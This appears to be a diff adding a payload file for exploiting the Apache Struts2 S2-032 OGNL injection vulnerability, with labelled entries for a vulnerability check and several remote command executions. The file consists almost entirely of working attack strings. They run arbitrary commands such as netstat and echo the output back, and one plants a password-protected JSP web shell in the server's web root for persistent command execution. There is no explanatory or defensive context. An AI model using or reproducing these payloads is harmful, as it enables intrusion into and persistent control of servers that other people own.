@@ -1,0 +1,75 @@
+print
+==============================
+?method:
+#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
+#test=#context.get(#parameters.res[0]).getWriter(),
+#test.println(#parameters.command[0]),
+#test.flush(),
+#test.close
+&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse
+&command=###Struts2 S2-032 Vulnerable###
+
+cmd gedit
+==============================
+?method:
+(#_memberAccess).setExcludedClasses(@java.util.Collections@EMPTY_SET),
+(#_memberAccess).setExcludedPackageNamePatterns(@java.util.Collections@EMPTY_SET),
+#cmd=
+#parameters.cmd,
+#a=new java.lang.ProcessBuilder(#cmd).start().getInputStream(),new java.lang.String
+&cmd=gedit
+
+open app
+==============================
+?method:
+#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
+@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),
+1?#xx:#request.toString&command=open+/Applications/Calculator.app
+
+cmd netstat
+==============================
+?method:
+#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
+#a=@java.lang.Runtime@getRuntime().exec(#parameters.command[0]).getInputStream(),
+#b=new java.io.InputStreamReader(#a),
+#c=new java.io.BufferedReader(#b),
+#d=new char[51020],
+#c.read(#d),
+#kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),
+#kxlzx.println(#d),
+#kxlzx.close
+&command=netstat
+
+upload webshell
+==============================
+shellname="nimabi.jsp"
+shellpwd="pwd"
+
+?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
+#a=#parameters.reqobj[0],
+#c=#parameters.reqobj[1],
+#req=#context.get(#a),
+#b=#req.getRealPath(#c)+#parameters.reqobj[2],
+#fos=new java.io.FileOutputStream(#b),
+#fos.write(#parameters.content[0].getBytes()),
+#fos.close(),
+#hh=#context.get(#parameters.rpsobj[0]),
+#hh.getWriter().println(#b),
+#hh.getWriter().flush(),
+#hh.getWriter().close(),
+1?#xx:#request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest
+&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=/&reqobj=" shellname "&content=gif89a
+<%
+if("024".equals(request.getParameter("" shellpwd ""))){
+java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("l")).getInputStream();
+int a = -1;
+byte[] b = new byte[2048];
+out.print("<pre>");
+while((a=in.read(b))!=-1){
+out.println(new String(b));
+}
+out.print("</pre>");
+}
+%>
+
+==============================
